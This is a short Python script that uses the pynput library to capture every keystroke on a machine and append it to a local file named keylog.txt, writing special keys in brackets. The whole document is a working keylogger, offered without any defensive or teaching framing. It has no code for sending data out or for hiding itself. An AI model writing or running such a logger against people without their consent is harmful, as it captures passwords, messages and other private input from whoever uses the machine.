from pynput import keyboard
log= "keylog.txt"

def if_press(key):
    try:
        with open(log, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log , "a") as f:
            f.write(f" [{key}] ")

with keyboard.Listener(on_press=if_press) as listener:
    listener.join()
